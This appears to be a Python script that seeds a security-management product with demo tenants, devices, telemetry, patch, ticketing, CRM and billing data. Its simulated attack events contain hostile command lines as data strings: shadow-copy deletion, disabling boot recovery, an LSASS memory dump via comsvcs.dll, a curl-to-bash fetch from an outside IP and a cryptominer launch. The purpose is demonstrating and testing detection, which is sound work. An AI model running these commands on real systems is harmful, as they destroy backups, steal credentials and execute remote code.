"""Populate a Fenrir Cloud instance with realistic demo data through its public APIs.

    python -m fenrir_cloud.demo --url http://localhost:8080 --email admin@fenrir.local --password '...'

Everything goes through the same endpoints real agents and analysts use, so
it doubles as an end-to-end smoke test. Never point it at production.
"""

from __future__ import annotations

import argparse
import json
import random
import uuid
from datetime import datetime, timedelta, timezone

import httpx


def _now(offset_minutes: float = 0) -> str:
    return (datetime.now(timezone.utc) - timedelta(minutes=offset_minutes)).isoformat()


def win(event_type: str, minutes_ago: float, **payload) -> dict:
    return {"eventId": str(uuid.uuid4()), "eventType": event_type, "source": "demo", "summary": "",
            "occurredAt": _now(minutes_ago), "payloadJson": json.dumps(payload)}


def unified(event_type: str, minutes_ago: float, **payload) -> dict:
    return {"eventId": str(uuid.uuid4()), "eventType": event_type, "timestamp": _now(minutes_ago), "payload": payload}


def ransomware_chain(start: float) -> list[dict]:
    temp = "C:\\Users\\jsmith\\AppData\\Local\\Temp\\invoice_viewer.exe"
    events = [
        win("process.start", start, processImagePath="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            commandLine='"WINWORD.EXE" /n "C:\\Users\\jsmith\\Downloads\\Invoice_4471.docm"', pid=3120),
        win("process.start", start - 1, processImagePath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            parentProcessImagePath="C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            commandLine="powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA", pid=4410, ppid=3120),
        win("process.start", start - 2, processImagePath=temp, parentProcessImagePath="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            commandLine=f"{temp} --silent", pid=5512, ppid=4410),
        win("network.connect", start - 2.5, processImagePath=temp, remoteAddress="185.220.101.47", remotePort=4444, pid=5512),
        win("process.start", start - 3, processImagePath="C:\\Windows\\System32\\vssadmin.exe", commandLine="vssadmin.exe delete shadows /all /quiet",
            parentProcessImagePath=temp, pid=5601, ppid=5512),
        win("process.start", start - 3.2, processImagePath="C:\\Windows\\System32\\bcdedit.exe",
            commandLine="bcdedit /set {default} recoveryenabled no", parentProcessImagePath=temp, pid=5602, ppid=5512),
    ]
    for i in range(32):
        events.append(win("file.rename", start - 4 - i / 60, processImagePath=temp, pid=5512,
                          targetPath=f"C:\\Users\\jsmith\\Documents\\Finance\\Q{i % 4 + 1}_report_{i}.xlsx.akira"))
    events.append(win("file.create", start - 5, processImagePath=temp, pid=5512, path="C:\\Users\\jsmith\\Desktop\\README_TO_DECRYPT.txt"))
    events.append(win("ransomware.canary.touched", start - 5, processImagePath=temp, pid=5512, path="C:\\Users\\jsmith\\Documents\\~$fenrir_canary.docx"))
    return events


def benign(minutes_ago: float) -> list[dict]:
    apps = [("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", "chrome.exe --type=renderer"),
            ("C:\\Windows\\explorer.exe", "explorer.exe"), ("C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE", "OUTLOOK.EXE"),
            ("C:\\Windows\\System32\\svchost.exe", "svchost.exe -k netsvcs")]
    image, cmd = random.choice(apps)
    return [win("process.start", minutes_ago, processImagePath=image, commandLine=cmd, pid=random.randint(1000, 9000))]


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--url", default="http://localhost:8080")
    parser.add_argument("--email", default="admin@fenrir.local")
    parser.add_argument("--password", required=True)
    args = parser.parse_args()

    http = httpx.Client(base_url=args.url, timeout=60)
    token = http.post("/api/console/auth/login", json={"email": args.email, "password": args.password}).raise_for_status().json()["token"]
    admin = {"Authorization": f"Bearer {token}"}

    def post(path: str, body: dict, headers: dict | None = None) -> dict:
        response = http.post(path, json=body, headers=headers or admin)
        response.raise_for_status()
        return response.json()

    customers = [("Acme Dental Group", "balanced"), ("Northwind Legal LLP", "strict"), ("Contoso Manufacturing", "server")]
    tenants = [post("/api/console/tenants", {"name": name, "template": template}) for name, template in customers]

    fleet = []
    for tenant, prefix, hosts in zip(tenants, ("ACME", "NWL", "CON"), (6, 4, 5)):
        token = post("/api/console/enrollment-tokens", {"tenantId": tenant["id"], "label": "Demo rollout"})["token"]
        for i in range(hosts):
            linux = prefix == "CON" and i >= 3
            os_version = "Ubuntu 22.04.4 LTS" if linux else random.choice(["Windows 11 Pro 23H2", "Windows 11 Enterprise 24H2", "Windows Server 2022"])
            device = post("/api/v1/enroll", {"hostname": f"{prefix}-{'SRV' if linux else 'WS'}-{i + 1:02d}", "osVersion": os_version,
                                             "serialNumber": f"{prefix}{i:04d}", "agentVersion": "1.6.0"}, {"X-Fenrir-Token": token})
            device["headers"] = {"X-Device-Api-Key": device["deviceApiKey"]}
            device["linux"] = linux
            fleet.append(device)
            free = random.choice([62.0, 48.5, 33.1, 21.7, 7.4]) if i else 6.2
            http.post(f"/api/v1/devices/{device['deviceId']}/heartbeat", headers=device["headers"],
                      json={"agentVersion": "1.6.0", "platformVersion": "1.6.0", "healthState": "healthy", "isolated": False,
                            "metrics": {"cpuPercent": random.uniform(3, 65), "memoryPercent": random.uniform(30, 85),
                                        "memoryTotalGb": 16, "uptimeSeconds": random.randint(3600, 40 * 86400),
                                        "disks": [{"mount": "/" if linux else "C:", "totalGb": 256, "freeGb": 256 * free / 100,
                                                   "freePercent": free}],
                                        "loggedOnUser": "" if linux else f"{prefix}\\user{i + 1}", "rebootPending": i == 2,
                                        "manufacturer": "Dell Inc." if not linux else "QEMU", "model": "OptiPlex 7010" if not linux else "Standard PC"}})

    def telemetry(device: dict, events: list[dict]) -> None:
        for start in range(0, len(events), 500):
            post(f"/api/v1/devices/{device['deviceId']}/telemetry", {"events": events[start:start + 500]}, device["headers"])

    for device in fleet:
        telemetry(device, [e for m in range(0, 600, 15) for e in benign(m)])
        if device["linux"]:
            telemetry(device, [unified("device.inventory.snapshot", 30, software=[
                {"name": "openssl", "version": "3.0.2-0ubuntu1.10"}, {"name": "openssh-server", "version": "1:8.9p1-3ubuntu0.4"},
                {"name": "sudo", "version": "1.9.9-1ubuntu2.3"}, {"name": "curl", "version": "7.81.0-1ubuntu1.13"}])])

    # Attack stories.
    telemetry(fleet[0], ransomware_chain(40))
    telemetry(fleet[7], [win("process.start", 90, processImagePath="C:\\Windows\\System32\\rundll32.exe",
                             commandLine="rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 712 C:\\Temp\\l.dmp full", pid=6620)])
    linux_box = next(d for d in fleet if d["linux"])
    telemetry(linux_box, [unified("ProcessStart", 120, processName="bash", pid=2201,
                                  commandLine="curl -s http://45.9.148.12/x.sh | bash", image="/usr/bin/bash"),
                          unified("ProcessStart", 119, processName="kdevtmpfsi", pid=2240, image="/tmp/kdevtmpfsi",
                                  commandLine="/tmp/kdevtmpfsi -o pool.supportxmr.com:443")])
    telemetry(fleet[3], [win("scan.threat.quarantined", 300, path="C:\\Users\\Public\\Downloads\\crack_setup.exe",
                             threatName="Win32/Agent.Stealer", score=96, verdict="quarantined")])

    post("/api/console/intel/indicators", {"tenantId": None, "values": ["185.220.101.47", "45.9.148.12", "invoice-portal-secure.top",
                                                                         "a" * 64], "category": "command-and-control"})
    post("/api/console/automations", {"tenantId": None, "name": "Isolate on ransomware behaviour",
                                      "conditions": {"minSeverity": "critical", "mitre": ["T1486"]},
                                      "actions": [{"type": "command", "command": "device.isolate"}, {"type": "ticket"}]})
    post("/api/console/exposure/assets", {"tenantId": tenants[0]["id"], "target": "localhost", "label": "Demo gateway (this server)",
                                          "ownershipConfirmed": True})

    leads = [("Initech", "Bill Lumbergh", "Proposal", 14400, 60), ("Globex Corporation", "Hank Scorpio", "Qualified", 30000, 120),
             ("Umbrella Clinics", "Alice Abernathy", "New", 6000, 25), ("Stark Logistics", "Pepper Potts", "Contacted", 9600, 40),
             ("Wayne Estates", "Lucius Fox", "Won", 4800, 20)]
    for company, contact, stage, value, seats in leads:
        post("/api/console/crm/leads", {"company": company, "contact": contact, "email": f"{contact.split()[0].lower()}@{company.split()[0].lower()}.example",
                                        "stage": stage, "value": value, "seats": seats, "source": "Referral"})
    for tenant, price in zip(tenants, (6.5, 9.0, 7.25)):
        post("/api/console/billing/contracts", {"accountTenantId": tenant["id"], "name": f"{tenant['name']} managed security",
                                                "pricePerDevice": price, "monthlyFee": 150, "hourlyRate": 85, "includedHours": 2})
        post("/api/console/tickets", {"accountTenantId": tenant["id"], "subject": "New starter laptop setup", "priority": "P3"})
    project = post("/api/console/crm/projects", {"name": "Cyber Essentials Plus certification", "accountTenantId": tenants[1]["id"],
                                                 "status": "In Progress", "progress": 45, "budget": 4500, "estimatedHours": 40,
                                                 "phases": [{"name": "Scoping", "status": "Done", "budgetHours": 4},
                                                            {"name": "Remediation", "status": "In Progress", "budgetHours": 24},
                                                            {"name": "Assessment", "status": "Open", "budgetHours": 12}]})

    # ---- RMM: patches reported by agents, a script job, a patch policy and a schedule ----
    def complete(device: dict, command_type: str, result: dict) -> None:
        items = http.get(f"/api/v1/devices/{device['deviceId']}/commands/pending", headers=device["headers"]).json()["items"]
        for item in items:
            if item["type"] == command_type:
                post(f"/api/v1/devices/{device['deviceId']}/commands/{item['id']}/complete",
                     {"status": "completed", "resultJson": json.dumps(result)}, device["headers"])

    windows_patches = [{"id": "KB5048685", "title": "2026-10 Cumulative Update for Windows 11 (KB5048685)", "classification": "Security Updates", "severity": "Critical"},
                       {"id": "KB5048779", "title": "2026-10 .NET Framework Cumulative Update", "classification": "Security Updates", "severity": "Important"},
                       {"id": "KB890830", "title": "Windows Malicious Software Removal Tool", "classification": "Update Rollups"},
                       {"id": "KB5049999", "title": "Feature update to Windows 11, version 25H2", "classification": "Upgrades"},
                       {"id": "winget:Google.Chrome", "title": "Google Chrome 129 -> 130", "source": "winget", "installedVersion": "129.0.6668.90", "availableVersion": "130.0.6723.70"},
                       {"id": "winget:Adobe.Acrobat.Reader.64-bit", "title": "Adobe Acrobat Reader 24.003 -> 24.004", "source": "winget"}]
    linux_patches = [{"id": "apt:openssl", "title": "openssl 3.0.2-0ubuntu1.15 -> 3.0.2-0ubuntu1.18", "source": "apt", "classification": "security"},
                     {"id": "apt:curl", "title": "curl 7.81.0-1ubuntu1.16 -> 7.81.0-1ubuntu1.20", "source": "apt", "classification": "security"},
                     {"id": "apt:tzdata", "title": "tzdata 2024a -> 2024b", "source": "apt", "classification": "updates"}]
    post("/api/console/rmm/patches/scan", {"targets": {"tenantIds": [t["id"] for t in tenants]}})
    for n, device in enumerate(fleet):
        patches = linux_patches if device["linux"] else windows_patches[: 6 - (n % 3)]
        complete(device, "patch.scan", {"patches": patches if n % 5 else [], "rebootPending": n % 4 == 0})
    for tenant in tenants:
        post("/api/console/rmm/patch-policies", {"tenantId": tenant["id"], "name": f"{tenant['name']} patching",
                                                 "window": {"days": [1, 3], "start": "22:00", "durationMinutes": 180, "tz": "Europe/London"},
                                                 "rings": [{"name": "Pilot", "groupIds": [], "delayDays": 0}, {"name": "Broad", "groupIds": [], "delayDays": 5}]})
    scripts = http.get("/api/console/rmm/scripts", headers=admin).json()
    disk_report = next(sc for sc in scripts if sc["name"] == "Disk space report" and sc["language"] == "powershell")
    job = post(f"/api/console/rmm/scripts/{disk_report['id']}/run", {"targets": {"tenantIds": [tenants[0]["id"]]}, "parameters": {"Path": "C:\\Users"}})
    for device in fleet:
        complete(device, "script.run", {"exitCode": 0, "durationMs": 2140, "stdout": "DeviceID SizeGB FreeGB FreePct\n-------- ------ ------ -------\nC:       237.9  58.2   24.5\n",
                                        "stderr": ""})
    temp = next(sc for sc in scripts if sc["name"] == "Clear temporary files")
    post("/api/console/rmm/tasks", {"tenantId": tenants[0]["id"], "name": "Weekly clean-up", "schedule": {"type": "weekly", "at": "03:00", "days": [6], "tz": "Europe/London"},
                                    "targets": {"tenantIds": [tenants[0]["id"]], "platforms": ["windows"]},
                                    "actions": [{"type": "script", "scriptId": temp["id"], "parameters": {"OlderThanDays": "7"}}, {"type": "command", "command": "patch.scan"}]})

    # ---- PSA: tickets on boards with notes, time and dispatch; configurations; quotes; KB ----
    me = http.get("/api/console/auth/me", headers=admin).json()["user"]["email"]
    samples = [(tenants[0], "Reception printer shows offline", "Incident", "Hardware", "Printer", "Medium", "High"),
               (tenants[0], "New starter: Sarah Jones (Monday)", "Service Request", "User", "New starter", "Low", "Medium"),
               (tenants[1], "Outlook keeps asking for password", "Incident", "Software", "Microsoft 365", "Medium", "Medium"),
               (tenants[1], "VPN disconnects every 10 minutes", "Incident", "Network", "VPN", "High", "Medium"),
               (tenants[2], "Line-of-business app slow on SRV-01", "Incident", "Software", "Line of business", "High", "High")]
    tickets = []
    for tenant, subject, type_, subtype, item, impact, urgency in samples:
        tickets.append(post("/api/console/tickets", {"accountTenantId": tenant["id"], "subject": subject, "type": type_, "subtype": subtype,
                                                    "item": item, "impact": impact, "urgency": urgency, "source": "phone",
                                                    "description": f"Customer reported: {subject.lower()}."}))
    http.patch(f"/api/console/tickets/{tickets[0]['id']}", headers=admin, json={"status": "In Progress", "assignee": me,
                                                                                 "comment": "Restarted the print spooler remotely; test page printed."})
    post("/api/console/psa/time", {"ticketId": tickets[0]["id"], "hours": 0.5, "workType": "Remote Support", "notes": "Spooler restart and test print"})
    post("/api/console/psa/time", {"ticketId": tickets[3]["id"], "hours": 1.25, "workType": "Remote Support", "notes": "Captured VPN logs; MTU looks wrong"})
    from datetime import datetime as _dt, timedelta as _td
    tomorrow = (_dt.now() + _td(days=1)).replace(hour=10, minute=0, second=0, microsecond=0)
    post("/api/console/psa/schedule", {"ticketId": tickets[1]["id"], "member": me, "kind": "Onsite", "startAt": tomorrow.isoformat(),
                                        "endAt": (tomorrow + _td(hours=2)).isoformat(), "location": "Acme Dental, reception"})
    post("/api/console/psa/configurations/sync", {})
    post("/api/console/psa/configurations", {"accountTenantId": tenants[0]["id"], "name": "Acme firewall", "type": "Firewall",
                                             "manufacturer": "Fortinet", "model": "FortiGate 60F", "serialNumber": "FGT60F0000001",
                                             "ipAddress": "192.168.1.1", "warrantyExpires": "2027-03-31"})
    m365 = post("/api/console/psa/products", {"sku": "M365-BP", "description": "Microsoft 365 Business Premium", "price": 18.10, "cost": 16.40, "recurring": True})
    laptop = post("/api/console/psa/products", {"sku": "LAP-DELL-5450", "description": "Dell Latitude 5450, 16GB, 512GB", "category": "Hardware", "price": 1049, "cost": 879})
    post("/api/console/psa/quotes", {"accountTenantId": tenants[0]["id"], "title": "New starter kit",
                                     "lines": [{"productId": laptop["id"], "quantity": 1}, {"productId": m365["id"], "quantity": 1},
                                               {"description": "Build and deployment (hours)", "quantity": 2, "unitPrice": 85}]})
    post("/api/console/psa/kb", {"title": "Reset your Microsoft 365 password", "category": "Accounts", "public": True,
                                 "body": "1. Go to https://aka.ms/sspr\n2. Enter your work email\n3. Follow the verification steps."})
    post("/api/console/psa/kb", {"title": "Runbook: printer offline at Acme reception", "category": "Runbooks", "public": False,
                                 "body": "Restart the Spooler service (script: Restart a service), then check the printer's IP lease on the firewall."})
    post("/api/console/psa/workflows", {"name": "Close tickets waiting on the customer for 3 days", "trigger": "ticket.idle", "idleHours": 72,
                                        "conditions": [{"field": "status", "op": "equals", "value": "Waiting Customer"}],
                                        "actions": [{"type": "set", "field": "status", "value": "Closed"},
                                                    {"type": "note", "text": "Closed automatically after 3 days without a reply. Reply to reopen.", "kind": "discussion", "emailContact": True}]})
    print(f"Demo ready: {len(tenants)} tenants, {len(fleet)} devices, attacks replayed, RMM and PSA data loaded "
          f"(job {job['id']}, project {project['id']}). Open {args.url}")


if __name__ == "__main__":
    main()
